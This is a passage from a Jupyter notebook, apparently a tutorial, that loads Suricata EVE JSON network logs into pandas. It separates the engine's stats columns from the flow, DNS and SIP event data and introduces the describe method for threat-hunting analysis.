       "      <td>2.0</td>\n",
       "      <td>2.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25885</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>2.637278e+13</td>\n",
       "      <td>flow</td>\n",
       "      <td>89.248.163.166</td>\n",
       "      <td>54222.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>5554.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25886</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>2.599530e+14</td>\n",
       "      <td>flow</td>\n",
       "      <td>45.146.166.123</td>\n",
       "      <td>52482.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>35829.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25887</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>2.198347e+15</td>\n",
       "      <td>flow</td>\n",
       "      <td>89.248.165.248</td>\n",
       "      <td>55041.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>8443.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25888</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>9.765911e+14</td>\n",
       "      <td>flow</td>\n",
       "      <td>89.248.163.155</td>\n",
       "      <td>8080.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>1206.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25889</th>\n",
       "      <td>2023-02-02T10:22:28.190234+0000</td>\n",
       "      <td>NaN</td>\n",
       "      <td>stats</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>25890 rows × 547 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                             timestamp       flow_id event_type  \\\n",
       "0      2022-01-01T00:00:13.076985+0000  1.777836e+15       flow   \n",
       "1      2022-01-01T00:01:49.092097+0000  1.521456e+15        dns   \n",
       "2      2022-01-01T00:00:13.076985+0000  6.780576e+14       flow   \n",
       "3      2022-01-01T00:05:51.487413+0000  2.093425e+15        sip   \n",
       "4      2022-01-01T00:00:13.076985+0000  2.068446e+15       flow   \n",
       "...                                ...           ...        ...   \n",
       "25885  2022-01-01T00:00:13.076985+0000  2.637278e+13       flow   \n",
       "25886  2022-01-01T00:00:13.076985+0000  2.599530e+14       flow   \n",
       "25887  2022-01-01T00:00:13.076985+0000  2.198347e+15       flow   \n",
       "25888  2022-01-01T00:00:13.076985+0000  9.765911e+14       flow   \n",
       "25889  2023-02-02T10:22:28.190234+0000           NaN      stats   \n",
       "\n",
       "                src_ip  src_port        dest_ip  dest_port proto  \\\n",
       "0      178.175.173.166   43719.0  198.71.247.91       23.0   TCP   \n",
       "1        209.141.58.15   35550.0  198.71.247.91       53.0   UDP   \n",
       "2        54.83.160.152       NaN  198.71.247.91        NaN  ICMP   \n",
       "3        193.46.255.60    5103.0  198.71.247.91     5060.0   UDP   \n",
       "4         18.207.93.95       NaN  198.71.247.91        NaN  ICMP   \n",
       "...                ...       ...            ...        ...   ...   \n",
       "25885   89.248.163.166   54222.0  198.71.247.91     5554.0   TCP   \n",
       "25886   45.146.166.123   52482.0  198.71.247.91    35829.0   TCP   \n",
       "25887   89.248.165.248   55041.0  198.71.247.91     8443.0   TCP   \n",
       "25888   89.248.163.155    8080.0  198.71.247.91     1206.0   TCP   \n",
       "25889              NaN       NaN            NaN        NaN   NaN   \n",
       "\n",
       "       flow.pkts_toserver  flow.pkts_toclient  ...  \\\n",
       "0                     1.0                 0.0  ...   \n",
       "1                     NaN                 NaN  ...   \n",
       "2                     2.0                 2.0  ...   \n",
       "3                     NaN                 NaN  ...   \n",
       "4                     2.0                 2.0  ...   \n",
       "...                   ...                 ...  ...   \n",
       "25885                 1.0                 0.0  ...   \n",
       "25886                 1.0                 0.0  ...   \n",
       "25887                 1.0                 0.0  ...   \n",
       "25888                 1.0                 0.0  ...   \n",
       "25889                 NaN                 NaN  ...   \n",
       "\n",
       "       stats.app_layer.error.nfs_udp.internal  \\\n",
       "0                                         NaN   \n",
       "1                                         NaN   \n",
       "2                                         NaN   \n",
       "3                                         NaN   \n",
       "4                                         NaN   \n",
       "...                                       ...   \n",
       "25885                                     NaN   \n",
       "25886                                     NaN   \n",
       "25887                                     NaN   \n",
       "25888                                     NaN   \n",
       "25889                                     0.0   \n",
       "\n",
       "       stats.app_layer.error.krb5_udp.alloc  \\\n",
       "0                                       NaN   \n",
       "1                                       NaN   \n",
       "2                                       NaN   \n",
       "3                                       NaN   \n",
       "4                                       NaN   \n",
       "...                                     ...   \n",
       "25885                                   NaN   \n",
       "25886                                   NaN   \n",
       "25887                                   NaN   \n",
       "25888                                   NaN   \n",
       "25889                                   0.0   \n",
       "\n",
       "      stats.app_layer.error.krb5_udp.parser  \\\n",
       "0                                       NaN   \n",
       "1                                       NaN   \n",
       "2                                       NaN   \n",
       "3                                       NaN   \n",
       "4                                       NaN   \n",
       "...                                     ...   \n",
       "25885                                   NaN   \n",
       "25886                                   NaN   \n",
       "25887                                   NaN   \n",
       "25888                                   NaN   \n",
       "25889                                   0.0   \n",
       "\n",
       "      stats.app_layer.error.krb5_udp.internal  stats.app_layer.expectations  \\\n",
       "0                                         NaN                           NaN   \n",
       "1                                         NaN                           NaN   \n",
       "2                                         NaN                           NaN   \n",
       "3                                         NaN                           NaN   \n",
       "4                                         NaN                           NaN   \n",
       "...                                       ...                           ...   \n",
       "25885                                     NaN                           NaN   \n",
       "25886                                     NaN                           NaN   \n",
       "25887                                     NaN                           NaN   \n",
       "25888                                     NaN                           NaN   \n",
       "25889                                     0.0                           0.0   \n",
       "\n",
       "      stats.http.memuse stats.http.memcap stats.ftp.memuse stats.ftp.memcap  \\\n",
       "0                   NaN               NaN              NaN              NaN   \n",
       "1                   NaN               NaN              NaN              NaN   \n",
       "2                   NaN               NaN              NaN              NaN   \n",
       "3                   NaN               NaN              NaN              NaN   \n",
       "4                   NaN               NaN              NaN              NaN   \n",
       "...                 ...               ...              ...              ...   \n",
       "25885               NaN               NaN              NaN              NaN   \n",
       "25886               NaN               NaN              NaN              NaN   \n",
       "25887               NaN               NaN              NaN              NaN   \n",
       "25888               NaN               NaN              NaN              NaN   \n",
       "25889               0.0               0.0              0.0              0.0   \n",
       "\n",
       "      stats.file_store.open_files  \n",
       "0                             NaN  \n",
       "1                             NaN  \n",
       "2                             NaN  \n",
       "3                             NaN  \n",
       "4                             NaN  \n",
       "...                           ...  \n",
       "25885                         NaN  \n",
       "25886                         NaN  \n",
       "25887                         NaN  \n",
       "25888                         NaN  \n",
       "25889                         0.0  \n",
       "\n",
       "[25890 rows x 547 columns]"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "with open(\"/tmp/logs/eve.json\", \"r\") as handle:\n",
    "    DF = pd.json_normalize([\n",
    "        json.loads(line) for line in handle\n",
    "    ])\n",
    "DF"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f9510033-4d33-4294-a093-a6cea42643c1",
   "metadata": {
    "tags": []
   },
   "source": [
    "#### Quick overview of columns\n",
    "\n",
    "Before proceeding analyzing the data, we need a initial overview of what we can work with. The most simple measurement is simply understanding the number of rows and columns in the set."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "f6fef6d9-dbf2-4650-acf5-f98e4e3bfa36",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(25890, 547)"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "DF.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "66f5efc8-1513-4912-bea0-2ef3f3161089",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dataframe has 25890 rows and 547 columns\n"
     ]
    }
   ],
   "source": [
    "print(\"dataframe has %d rows and %d columns\" % DF.shape)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "11ab53ff-4e35-4ba6-bd6b-e19be0dd4218",
   "metadata": {},
   "source": [
    "As mentioned before, understanding the available fields is particularly important for EVE data. This info can be accessed directly from the dataframe object. The reader might also observe significant noise in these values, as the simple EVE log we loaded most likely contains `stats` events. These fields provide a lot of statistics from Suricata engine and are really useful for finding performance problems. However, they don't contribute much to threat hunting and simply overshadow data fields.\n",
    "\n",
    "To deal with this, we can write simple python to filter them out and provide a much cleaner view of the data."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "ba38b508-b530-4ba1-9d93-27be5ec9d63b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "431"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "COLS_STATS = [c for c in list(DF.columns.values) if c.startswith(\"stats\")]\n",
    "len(COLS_STATS)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "b15c709a-630c-451c-b48c-6799d362fa11",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "431 stats cols from total 547\n"
     ]
    }
   ],
   "source": [
    "print(\"%d stats cols from total %d\" % (len(COLS_STATS), len(DF.columns.values)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "73980b34-f85d-418e-9d67-79aa35137518",
   "metadata": {},
   "outputs": [],
   "source": [
    "COLS_DATA = [c for c in list(DF.columns.values) if not c.startswith(\"stats\")]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "8202cc26-c14b-4526-b477-f5fd23ba2e9b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "116 data columns\n"
     ]
    }
   ],
   "source": [
    "print(\"%d data columns\" % len(COLS_DATA))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "96cc7a67-e55d-494a-807e-8dda6ec6bcdb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe tex2jax_ignore\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>flow_id</th>\n",
       "      <th>event_type</th>\n",
       "      <th>src_ip</th>\n",
       "      <th>src_port</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>dest_port</th>\n",
       "      <th>proto</th>\n",
       "      <th>flow.pkts_toserver</th>\n",
       "      <th>flow.pkts_toclient</th>\n",
       "      <th>...</th>\n",
       "      <th>alert.metadata.signature_severity</th>\n",
       "      <th>quic.version</th>\n",
       "      <th>files</th>\n",
       "      <th>app_proto_ts</th>\n",
       "      <th>metadata.flowints.http.anomaly.count</th>\n",
       "      <th>snmp.usm</th>\n",
       "      <th>metadata.flowints.tcp.retransmission.count</th>\n",
       "      <th>tcp.ecn</th>\n",
       "      <th>tcp.cwr</th>\n",
       "      <th>metadata.flowbits</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>1.777836e+15</td>\n",
       "      <td>flow</td>\n",
       "      <td>178.175.173.166</td>\n",
       "      <td>43719.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>23.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>2022-01-01T00:01:49.092097+0000</td>\n",
       "      <td>1.521456e+15</td>\n",
       "      <td>dns</td>\n",
       "      <td>209.141.58.15</td>\n",
       "      <td>35550.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>53.0</td>\n",
       "      <td>UDP</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>6.780576e+14</td>\n",
       "      <td>flow</td>\n",
       "      <td>54.83.160.152</td>\n",
       "      <td>NaN</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>NaN</td>\n",
       "      <td>ICMP</td>\n",
       "      <td>2.0</td>\n",
       "      <td>2.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>2022-01-01T00:05:51.487413+0000</td>\n",
       "      <td>2.093425e+15</td>\n",
       "      <td>sip</td>\n",
       "      <td>193.46.255.60</td>\n",
       "      <td>5103.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>5060.0</td>\n",
       "      <td>UDP</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>2.068446e+15</td>\n",
       "      <td>flow</td>\n",
       "      <td>18.207.93.95</td>\n",
       "      <td>NaN</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>NaN</td>\n",
       "      <td>ICMP</td>\n",
       "      <td>2.0</td>\n",
       "      <td>2.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25885</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>2.637278e+13</td>\n",
       "      <td>flow</td>\n",
       "      <td>89.248.163.166</td>\n",
       "      <td>54222.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>5554.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25886</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>2.599530e+14</td>\n",
       "      <td>flow</td>\n",
       "      <td>45.146.166.123</td>\n",
       "      <td>52482.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>35829.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25887</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>2.198347e+15</td>\n",
       "      <td>flow</td>\n",
       "      <td>89.248.165.248</td>\n",
       "      <td>55041.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>8443.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25888</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>9.765911e+14</td>\n",
       "      <td>flow</td>\n",
       "      <td>89.248.163.155</td>\n",
       "      <td>8080.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>1206.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25889</th>\n",
       "      <td>2023-02-02T10:22:28.190234+0000</td>\n",
       "      <td>NaN</td>\n",
       "      <td>stats</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>25890 rows × 116 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                             timestamp       flow_id event_type  \\\n",
       "0      2022-01-01T00:00:13.076985+0000  1.777836e+15       flow   \n",
       "1      2022-01-01T00:01:49.092097+0000  1.521456e+15        dns   \n",
       "2      2022-01-01T00:00:13.076985+0000  6.780576e+14       flow   \n",
       "3      2022-01-01T00:05:51.487413+0000  2.093425e+15        sip   \n",
       "4      2022-01-01T00:00:13.076985+0000  2.068446e+15       flow   \n",
       "...                                ...           ...        ...   \n",
       "25885  2022-01-01T00:00:13.076985+0000  2.637278e+13       flow   \n",
       "25886  2022-01-01T00:00:13.076985+0000  2.599530e+14       flow   \n",
       "25887  2022-01-01T00:00:13.076985+0000  2.198347e+15       flow   \n",
       "25888  2022-01-01T00:00:13.076985+0000  9.765911e+14       flow   \n",
       "25889  2023-02-02T10:22:28.190234+0000           NaN      stats   \n",
       "\n",
       "                src_ip  src_port        dest_ip  dest_port proto  \\\n",
       "0      178.175.173.166   43719.0  198.71.247.91       23.0   TCP   \n",
       "1        209.141.58.15   35550.0  198.71.247.91       53.0   UDP   \n",
       "2        54.83.160.152       NaN  198.71.247.91        NaN  ICMP   \n",
       "3        193.46.255.60    5103.0  198.71.247.91     5060.0   UDP   \n",
       "4         18.207.93.95       NaN  198.71.247.91        NaN  ICMP   \n",
       "...                ...       ...            ...        ...   ...   \n",
       "25885   89.248.163.166   54222.0  198.71.247.91     5554.0   TCP   \n",
       "25886   45.146.166.123   52482.0  198.71.247.91    35829.0   TCP   \n",
       "25887   89.248.165.248   55041.0  198.71.247.91     8443.0   TCP   \n",
       "25888   89.248.163.155    8080.0  198.71.247.91     1206.0   TCP   \n",
       "25889              NaN       NaN            NaN        NaN   NaN   \n",
       "\n",
       "       flow.pkts_toserver  flow.pkts_toclient  ...  \\\n",
       "0                     1.0                 0.0  ...   \n",
       "1                     NaN                 NaN  ...   \n",
       "2                     2.0                 2.0  ...   \n",
       "3                     NaN                 NaN  ...   \n",
       "4                     2.0                 2.0  ...   \n",
       "...                   ...                 ...  ...   \n",
       "25885                 1.0                 0.0  ...   \n",
       "25886                 1.0                 0.0  ...   \n",
       "25887                 1.0                 0.0  ...   \n",
       "25888                 1.0                 0.0  ...   \n",
       "25889                 NaN                 NaN  ...   \n",
       "\n",
       "       alert.metadata.signature_severity  quic.version files app_proto_ts  \\\n",
       "0                                    NaN           NaN   NaN          NaN   \n",
       "1                                    NaN           NaN   NaN          NaN   \n",
       "2                                    NaN           NaN   NaN          NaN   \n",
       "3                                    NaN           NaN   NaN          NaN   \n",
       "4                                    NaN           NaN   NaN          NaN   \n",
       "...                                  ...           ...   ...          ...   \n",
       "25885                                NaN           NaN   NaN          NaN   \n",
       "25886                                NaN           NaN   NaN          NaN   \n",
       "25887                                NaN           NaN   NaN          NaN   \n",
       "25888                                NaN           NaN   NaN          NaN   \n",
       "25889                                NaN           NaN   NaN          NaN   \n",
       "\n",
       "       metadata.flowints.http.anomaly.count snmp.usm  \\\n",
       "0                                       NaN      NaN   \n",
       "1                                       NaN      NaN   \n",
       "2                                       NaN      NaN   \n",
       "3                                       NaN      NaN   \n",
       "4                                       NaN      NaN   \n",
       "...                                     ...      ...   \n",
       "25885                                   NaN      NaN   \n",
       "25886                                   NaN      NaN   \n",
       "25887                                   NaN      NaN   \n",
       "25888                                   NaN      NaN   \n",
       "25889                                   NaN      NaN   \n",
       "\n",
       "      metadata.flowints.tcp.retransmission.count tcp.ecn tcp.cwr  \\\n",
       "0                                            NaN     NaN     NaN   \n",
       "1                                            NaN     NaN     NaN   \n",
       "2                                            NaN     NaN     NaN   \n",
       "3                                            NaN     NaN     NaN   \n",
       "4                                            NaN     NaN     NaN   \n",
       "...                                          ...     ...     ...   \n",
       "25885                                        NaN     NaN     NaN   \n",
       "25886                                        NaN     NaN     NaN   \n",
       "25887                                        NaN     NaN     NaN   \n",
       "25888                                        NaN     NaN     NaN   \n",
       "25889                                        NaN     NaN     NaN   \n",
       "\n",
       "      metadata.flowbits  \n",
       "0                   NaN  \n",
       "1                   NaN  \n",
       "2                   NaN  \n",
       "3                   NaN  \n",
       "4                   NaN  \n",
       "...                 ...  \n",
       "25885               NaN  \n",
       "25886               NaN  \n",
       "25887               NaN  \n",
       "25888               NaN  \n",
       "25889               NaN  \n",
       "\n",
       "[25890 rows x 116 columns]"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "DF[COLS_DATA]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "58eda896-ef6d-4bfa-b94c-8d530d0d4809",
   "metadata": {},
   "source": [
    "#### Describe method\n",
    "\n",
    "A `describe` method is a useful shortcut for understanding statistical properties of numeric columns. It has limited value for NSM data, as most fields are either textual or categorical. Some numerical EVE values can not be analyzed like this, for example source and destination ports, randomly generated flow ID values, etc. However, it can provide great insights into `flow` and `stats` records, instantly revealing data properties such as distribution, max and min values, mean values, standard deviation, etc."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "097fac81-7e3f-406c-b412-acfd5af4d263",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe tex2jax_ignore\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>flow_id</th>\n",
       "      <th>src_port</th>\n",
       "      <th>dest_port</th>\n",
       "      <th>flow.pkts_toserver</th>\n",
       "      <th>flow.pkts_toclient</th>\n",
       "      <th>flow.bytes_toserver</th>\n",
       "      <th>flow.bytes_toclient</th>\n",
       "      <th>flow.age</th>\n",
       "      <th>pcap_cnt</th>\n",
       "      <th>dns.id</th>\n",
       "      <th>...</th>\n",
       "      <th>stats.app_layer.error.nfs_udp.internal</th>\n",
       "      <th>stats.app_layer.error.krb5_udp.alloc</th>\n",
       "      <th>stats.app_layer.error.krb5_udp.parser</th>\n",
       "      <th>stats.app_layer.error.krb5_udp.internal</th>\n",
